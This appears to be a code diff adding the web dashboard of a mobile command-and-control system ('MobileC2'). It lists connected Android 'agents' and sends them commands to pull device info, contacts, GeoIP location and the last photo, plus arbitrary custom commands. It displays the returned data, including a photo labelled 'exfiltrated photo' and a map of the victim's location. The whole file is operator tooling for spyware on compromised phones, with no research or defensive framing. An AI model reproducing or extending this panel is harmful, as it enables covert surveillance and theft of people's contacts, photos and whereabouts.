@@ -1,0 +1,708 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>MobileC2 — Command Center</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Syne:wght@400;600;800&display=swap" rel="stylesheet"/>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
+<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<style>
+  :root {
+    --bg:       #0a0c0f;
+    --surface:  #111418;
+    --border:   #1e2530;
+    --accent:   #00ff88;
+    --accent2:  #0088ff;
+    --danger:   #ff3b5c;
+    --text:     #e2e8f0;
+    --muted:    #4a5568;
+    --mono:     'Share Tech Mono', monospace;
+    --sans:     'Syne', sans-serif;
+  }
+
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: var(--mono);
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+
+  /* scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    inset: 0;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,255,136,0.015) 2px,
+      rgba(0,255,136,0.015) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* ── header ── */
+  header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 18px 32px;
+    border-bottom: 1px solid var(--border);
+    background: var(--surface);
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  }
+
+  .logo {
+    font-family: var(--sans);
+    font-weight: 800;
+    font-size: 1.3rem;
+    letter-spacing: -0.02em;
+    color: var(--accent);
+  }
+  .logo span { color: var(--text); }
+
+  .status-pill {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    font-size: 0.75rem;
+    color: var(--muted);
+  }
+  .status-pill .dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--accent);
+    box-shadow: 0 0 8px var(--accent);
+    animation: pulse 2s infinite;
+  }
+  @keyframes pulse {
+    0%,100% { opacity: 1; }
+    50%      { opacity: 0.4; }
+  }
+
+  /* ── layout ── */
+  main {
+    display: grid;
+    grid-template-columns: 300px 1fr;
+    grid-template-rows: auto 1fr;
+    gap: 0;
+    height: calc(100vh - 61px);
+  }
+
+  /* ── sidebar ── */
+  .sidebar {
+    grid-row: 1 / 3;
+    border-right: 1px solid var(--border);
+    overflow-y: auto;
+    background: var(--surface);
+  }
+
+  .sidebar-header {
+    padding: 16px 20px;
+    border-bottom: 1px solid var(--border);
+    font-size: 0.65rem;
+    letter-spacing: 0.15em;
+    color: var(--muted);
+    text-transform: uppercase;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .agent-count {
+    background: var(--accent);
+    color: var(--bg);
+    font-size: 0.65rem;
+    font-weight: 700;
+    padding: 2px 8px;
+    border-radius: 10px;
+  }
+
+  .agent-card {
+    padding: 14px 20px;
+    border-bottom: 1px solid var(--border);
+    cursor: pointer;
+    transition: background 0.15s;
+    position: relative;
+  }
+  .agent-card:hover { background: rgba(0,255,136,0.04); }
+  .agent-card.active {
+    background: rgba(0,255,136,0.07);
+    border-left: 2px solid var(--accent);
+  }
+
+  .agent-id {
+    font-size: 0.75rem;
+    color: var(--accent);
+    margin-bottom: 4px;
+    white-space: nowrap;
+    overflow: hidden;
+    text-overflow: ellipsis;
+  }
+
+  .agent-model {
+    font-size: 0.8rem;
+    color: var(--text);
+    margin-bottom: 2px;
+  }
+
+  .agent-meta {
+    font-size: 0.68rem;
+    color: var(--muted);
+    display: flex;
+    gap: 10px;
+  }
+
+  .online-dot {
+    position: absolute;
+    top: 16px; right: 16px;
+    width: 7px; height: 7px;
+    border-radius: 50%;
+    background: var(--accent);
+    box-shadow: 0 0 6px var(--accent);
+  }
+
+  /* ── top bar ── */
+  .topbar {
+    padding: 16px 24px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    gap: 10px;
+    align-items: center;
+    flex-wrap: wrap;
+  }
+
+  select, input[type=text] {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 0.78rem;
+    padding: 8px 12px;
+    border-radius: 4px;
+    outline: none;
+    transition: border-color 0.15s;
+  }
+  select:focus, input[type=text]:focus {
+    border-color: var(--accent);
+  }
+
+  select { min-width: 180px; }
+  input[type=text] { flex: 1; min-width: 200px; }
+
+  .btn {
+    font-family: var(--mono);
+    font-size: 0.78rem;
+    padding: 8px 18px;
+    border-radius: 4px;
+    border: none;
+    cursor: pointer;
+    transition: all 0.15s;
+    letter-spacing: 0.05em;
+  }
+  .btn-primary {
+    background: var(--accent);
+    color: var(--bg);
+    font-weight: 700;
+  }
+  .btn-primary:hover {
+    background: #00e87a;
+    box-shadow: 0 0 16px rgba(0,255,136,0.4);
+  }
+  .btn-secondary {
+    background: transparent;
+    color: var(--muted);
+    border: 1px solid var(--border);
+  }
+  .btn-secondary:hover {
+    border-color: var(--muted);
+    color: var(--text);
+  }
+
+  /* ── content ── */
+  .content {
+    overflow-y: auto;
+    padding: 24px;
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+  }
+
+  /* ── info grid ── */
+  .info-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+    gap: 12px;
+  }
+
+  .info-tile {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    padding: 14px 16px;
+  }
+
+  .info-tile .label {
+    font-size: 0.6rem;
+    letter-spacing: 0.15em;
+    color: var(--muted);
+    text-transform: uppercase;
+    margin-bottom: 6px;
+  }
+
+  .info-tile .value {
+    font-size: 0.9rem;
+    color: var(--accent);
+  }
+
+  /* ── results ── */
+  .results-area {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    overflow: hidden;
+  }
+
+  .results-header {
+    padding: 10px 16px;
+    border-bottom: 1px solid var(--border);
+    font-size: 0.65rem;
+    letter-spacing: 0.15em;
+    color: var(--muted);
+    text-transform: uppercase;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .results-list {
+    max-height: 320px;
+    overflow-y: auto;
+  }
+
+  .result-item {
+    padding: 12px 16px;
+    border-bottom: 1px solid var(--border);
+    animation: fadeIn 0.3s ease;
+  }
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(-4px); }
+    to   { opacity: 1; transform: translateY(0); }
+  }
+
+  .result-item:last-child { border-bottom: none; }
+
+  .result-cmd {
+    font-size: 0.7rem;
+    color: var(--accent2);
+    margin-bottom: 6px;
+    display: flex;
+    justify-content: space-between;
+  }
+
+  .result-cmd .ts {
+    color: var(--muted);
+    font-size: 0.65rem;
+  }
+
+  .result-output {
+    font-size: 0.78rem;
+    color: var(--text);
+    white-space: pre-wrap;
+    word-break: break-all;
+    line-height: 1.5;
+  }
+
+  /* photo */
+  .result-photo {
+    margin-top: 8px;
+    max-width: 100%;
+    max-height: 280px;
+    border-radius: 4px;
+    border: 1px solid var(--border);
+    display: block;
+  }
+
+  /* ── map ── */
+  .map-container {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    overflow: hidden;
+  }
+
+  .map-header {
+    padding: 10px 16px;
+    border-bottom: 1px solid var(--border);
+    font-size: 0.65rem;
+    letter-spacing: 0.15em;
+    color: var(--muted);
+    text-transform: uppercase;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+  }
+
+  .map-address {
+    font-size: 0.75rem;
+    color: var(--accent);
+  }
+
+  #map {
+    height: 240px;
+    filter: grayscale(0.3) brightness(0.85);
+  }
+
+  /* empty state */
+  .empty {
+    padding: 40px;
+    text-align: center;
+    color: var(--muted);
+    font-size: 0.8rem;
+  }
+
+  .empty .icon { font-size: 2rem; margin-bottom: 10px; }
+
+  /* scrollbar */
+  ::-webkit-scrollbar { width: 4px; }
+  ::-webkit-scrollbar-track { background: transparent; }
+  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }
+
+  /* cmd quick btns */
+  .cmd-btns {
+    display: flex;
+    gap: 6px;
+    flex-wrap: wrap;
+  }
+  .cmd-chip {
+    font-family: var(--mono);
+    font-size: 0.7rem;
+    padding: 5px 10px;
+    border-radius: 3px;
+    border: 1px solid var(--border);
+    background: transparent;
+    color: var(--muted);
+    cursor: pointer;
+    transition: all 0.15s;
+  }
+  .cmd-chip:hover {
+    border-color: var(--accent);
+    color: var(--accent);
+  }
+
+  .no-agent {
+    grid-column: 1;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    height: 100%;
+    color: var(--muted);
+    gap: 12px;
+    font-size: 0.85rem;
+  }
+  .no-agent .big { font-size: 3rem; }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">Mobile<span>C2</span></div>
+  <div class="status-pill">
+    <div class="dot"></div>
+    <span id="status-text">connecting...</span>
+  </div>
+</header>
+
+<main>
+  <!-- sidebar -->
+  <aside class="sidebar">
+    <div class="sidebar-header">
+      Agents
+      <span class="agent-count" id="agent-count">0</span>
+    </div>
+    <div id="agent-list"></div>
+  </aside>
+
+  <!-- topbar -->
+  <div class="topbar">
+    <select id="cmd-select">
+      <option value="GET_DEVICE_INFO">GET_DEVICE_INFO</option>
+      <option value="GEOIP_INFO">GEOIP_INFO</option>
+      <option value="GET_CONTACTS">GET_CONTACTS</option>
+      <option value="LAST_PHOTO">LAST_PHOTO</option>
+      <option value="custom">— custom —</option>
+    </select>
+    <input type="text" id="custom-cmd" placeholder="custom command..." style="display:none"/>
+    <button class="btn btn-primary" onclick="sendCommand()">▶ SEND</button>
+    <button class="btn btn-secondary" onclick="clearResults()">✕ CLEAR</button>
+    <div class="cmd-btns">
+      <button class="cmd-chip" onclick="quickCmd('GET_DEVICE_INFO')">device info</button>
+      <button class="cmd-chip" onclick="quickCmd('GEOIP_INFO')">geoip</button>
+      <button class="cmd-chip" onclick="quickCmd('GET_CONTACTS')">contacts</button>
+      <button class="cmd-chip" onclick="quickCmd('LAST_PHOTO')">last photo</button>
+    </div>
+  </div>
+
+  <!-- content -->
+  <div class="content" id="content">
+    <div class="no-agent">
+      <div class="big">📡</div>
+      <div>Select an agent to begin</div>
+    </div>
+  </div>
+</main>
+
+<script>
+const API = 'http://localhost:8000';
+let selectedAgent = null;
+let results = {};
+let map = null;
+let marker = null;
+
+// ── fetch agents ──────────────────────────────────────────────────────────
+async function fetchAgents() {
+  try {
+    const r = await fetch(`${API}/agents`);
+    const data = await r.json();
+    renderAgents(data);
+    document.getElementById('status-text').textContent = 'server online';
+  } catch(e) {
+    document.getElementById('status-text').textContent = 'server offline';
+  }
+}
+
+function renderAgents(data) {
+  const list = document.getElementById('agent-list');
+  const ids = Object.keys(data);
+  document.getElementById('agent-count').textContent = ids.length;
+
+  if (ids.length === 0) {
+    list.innerHTML = '<div class="empty"><div class="icon">📵</div>No agents connected</div>';
+    return;
+  }
+
+  list.innerHTML = ids.map(id => {
+    const a = data[id];
+    const lastSeen = new Date(a.last_seen);
+    const secAgo = Math.floor((Date.now() - lastSeen) / 1000);
+    const timeStr = secAgo < 60 ? `${secAgo}s ago` : `${Math.floor(secAgo/60)}m ago`;
+    const active = selectedAgent === id ? 'active' : '';
+    return `
+      <div class="agent-card ${active}" onclick="selectAgent('${id}', ${JSON.stringify(a).replace(/"/g,'&quot;')})">
+        <div class="online-dot"></div>
+        <div class="agent-id">${id}</div>
+        <div class="agent-model">${a.device_model}</div>
+        <div class="agent-meta">
+          <span>Android ${a.os_version}</span>
+          <span>🔋${a.battery}%</span>
+          <span>${timeStr}</span>
+        </div>
+      </div>`;
+  }).join('');
+}
+
+// ── select agent ─────────────────────────────────────────────────────────
+function selectAgent(id, info) {
+  selectedAgent = id;
+  fetchAgents();
+  renderContent(id, info);
+}
+
+function renderContent(id, info) {
+  if (!results[id]) results[id] = [];
+
+  const content = document.getElementById('content');
+  content.innerHTML = `
+    <div class="info-grid" id="info-grid">
+      <div class="info-tile"><div class="label">Agent ID</div><div class="value" style="font-size:0.7rem">${id}</div></div>
+      <div class="info-tile"><div class="label">Model</div><div class="value">${info.device_model}</div></div>
+      <div class="info-tile"><div class="label">Android</div><div class="value">${info.os_version}</div></div>
+      <div class="info-tile"><div class="label">Battery</div><div class="value">${info.battery}%</div></div>
+      <div class="info-tile"><div class="label">Last Beacon</div><div class="value" style="font-size:0.72rem">${new Date(info.last_seen).toLocaleTimeString()}</div></div>
+    </div>
+
+    <div class="map-container" id="map-container" style="display:none">
+      <div class="map-header">
+        <span>Location</span>
+        <span class="map-address" id="map-address">resolving address...</span>
+      </div>
+      <div id="map"></div>
+    </div>
+
+    <div class="results-area">
+      <div class="results-header">
+        <span>Command Results</span>
+        <span id="result-count" style="color:var(--accent)">0 results</span>
+      </div>
+      <div class="results-list" id="results-list">
+        <div class="empty"><div class="icon">⌨️</div>No results yet — send a command</div>
+      </div>
+    </div>
+  `;
+
+  renderResults(id);
+}
+
+// ── send command ──────────────────────────────────────────────────────────
+async function sendCommand() {
+  if (!selectedAgent) { alert('Select an agent first'); return; }
+  const sel = document.getElementById('cmd-select').value;
+  const cmd = sel === 'custom'
+    ? document.getElementById('custom-cmd').value.trim()
+    : sel;
+  if (!cmd) return;
+
+  try {
+    await fetch(`${API}/command`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({agent_id: selectedAgent, command: cmd})
+    });
+  } catch(e) {
+    alert('Could not reach server');
+  }
+}
+
+function quickCmd(cmd) {
+  document.getElementById('cmd-select').value = cmd;
+  sendCommand();
+}
+
+// ── intercept results via polling ─────────────────────────────────────────
+// We patch the /result endpoint by polling a local results store.
+// Since results come to the server, we add a GET /results/:id endpoint.
+async function fetchResults() {
+  if (!selectedAgent) return;
+  try {
+    const r = await fetch(`${API}/results/${selectedAgent}`);
+    if (!r.ok) return;
+    const data = await r.json();
+    if (!results[selectedAgent]) results[selectedAgent] = [];
+    // merge new results
+    data.forEach(item => {
+      const exists = results[selectedAgent].find(r => r.ts === item.ts && r.command === item.command);
+      if (!exists) {
+        results[selectedAgent].unshift(item);
+        renderResults(selectedAgent);
+      }
+    });
+  } catch(e) {}
+}
+
+function renderResults(id) {
+  const list = document.getElementById('results-list');
+  const countEl = document.getElementById('result-count');
+  if (!list) return;
+
+  const items = results[id] || [];
+  if (countEl) countEl.textContent = `${items.length} results`;
+
+  if (items.length === 0) {
+    list.innerHTML = '<div class="empty"><div class="icon">⌨️</div>No results yet — send a command</div>';
+    return;
+  }
+
+  list.innerHTML = items.map(item => {
+    const ts = item.ts ? new Date(item.ts).toLocaleTimeString() : '';
+
+    if (item.command === 'LAST_PHOTO' && item.photo_url) {
+      return `
+        <div class="result-item">
+          <div class="result-cmd"><span>${item.command}</span><span class="ts">${ts}</span></div>
+          <div class="result-output">${item.output}</div>
+          <img class="result-photo" src="${API}${item.photo_url}" alt="exfiltrated photo"/>
+        </div>`;
+    }
+
+    if (item.command === 'GEOIP_INFO' && item.output.includes('lat=')) {
+      // parse coords and show map
+      setTimeout(() => showMap(item.output), 300);
+      return `
+        <div class="result-item">
+          <div class="result-cmd"><span>${item.command}</span><span class="ts">${ts}</span></div>
+          <div class="result-output">${item.output}</div>
+        </div>`;
+    }
+
+    return `
+      <div class="result-item">
+        <div class="result-cmd"><span>${item.command}</span><span class="ts">${ts}</span></div>
+        <div class="result-output">${item.output}</div>
+      </div>`;
+  }).join('');
+}
+
+// ── map ───────────────────────────────────────────────────────────────────
+function showMap(output) {
+  const latMatch = output.match(/lat=([\d.\-]+)/);
+  const lonMatch = output.match(/lon=([\d.\-]+)/);
+  if (!latMatch || !lonMatch) return;
+
+  const lat = parseFloat(latMatch[1]);
+  const lon = parseFloat(lonMatch[1]);
+
+  const container = document.getElementById('map-container');
+  if (!container) return;
+  container.style.display = 'block';
+
+  if (!map) {
+    map = L.map('map').setView([lat, lon], 16);
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+      attribution: '© OpenStreetMap'
+    }).addTo(map);
+    marker = L.circleMarker([lat, lon], {
+      radius: 10,
+      color: '#00ff88',
+      fillColor: '#00ff88',
+      fillOpacity: 0.5,
+      weight: 2
+    }).addTo(map);
+  } else {
+    map.setView([lat, lon], 16);
+    marker.setLatLng([lat, lon]);
+  }
+
+  setTimeout(() => map.invalidateSize(), 200);
+
+  // reverse geocoding
+  fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`)
+    .then(r => r.json())
+    .then(data => {
+      const addr = document.getElementById('map-address');
+      if (addr && data.display_name) {
+        addr.textContent = data.display_name.split(',').slice(0,3).join(',');
+      }
+    }).catch(() => {});
+}
+
+// ── cmd select toggle ─────────────────────────────────────────────────────
+document.getElementById('cmd-select').addEventListener('change', function() {
+  document.getElementById('custom-cmd').style.display =
+    this.value === 'custom' ? 'block' : 'none';
+});
+
+// ── clear ─────────────────────────────────────────────────────────────────
+async function clearResults() {
+    if (!selectedAgent) return;
+    await fetch(`${API}/results/${selectedAgent}`, { method: 'DELETE' });
+    results[selectedAgent] = [];
+    renderResults(selectedAgent);
+}
+
+// ── polling ───────────────────────────────────────────────────────────────
+fetchAgents();
+setInterval(fetchAgents, 5000);
+setInterval(fetchResults, 3000);
+</script>
+</body>
+</html>
